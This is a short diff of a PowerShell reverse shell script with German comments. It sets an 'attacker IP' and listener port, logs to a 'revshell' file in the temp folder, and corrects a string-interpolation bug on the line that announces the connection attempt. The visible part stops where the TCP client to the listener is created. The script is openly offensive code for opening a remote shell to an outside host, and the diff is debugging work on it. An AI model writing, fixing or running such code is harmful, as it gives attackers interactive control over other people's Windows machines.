@@ -4,7 +4,7 @@
 # --- KONFIGURATION START ---
 $ip = "192.168.2.127"  # <--- HIER IHRE ANGREIFER-IP-ADRESSE EINGEBEN!
 $port = 124           # <--- HIER IHREN LISTENER-PORT EINGEBEN!
-$logFile = "$env:TEMP\revshell_log.txt" # Pfad zur Log-Datei im temporären Verzeichnis
+$logFile = "$env:TEMP\revshell_log.txt" # Debugging-Log-Datei
 # --- KONFIGURATION ENDE ---
 
 # Hilfsfunktion zum Schreiben von Nachrichten in die Log-Datei
@@ -17,7 +17,8 @@ function Write-Log ($message) {
     }
 }
 
-Write-Log "Script started. Attempting connection to $ip:$port."
+# KORRIGIERTE ZEILE HIER (Line 20)
+Write-Log "Script started. Attempting connection to ${ip}:${port}."
 
 try {
     # Erstelle ein TCP-Client-Objekt und verbinde dich mit dem Listener
